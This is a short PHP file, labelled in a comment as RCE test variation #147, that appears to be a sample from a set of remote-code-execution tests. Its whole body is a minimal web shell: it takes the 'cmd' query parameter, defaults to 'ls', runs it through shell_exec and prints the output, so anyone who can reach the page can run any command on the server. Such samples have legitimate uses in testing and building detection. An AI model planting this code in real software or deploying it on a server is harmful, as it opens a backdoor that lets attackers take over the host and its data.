<?php
// RCE test variation #147
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>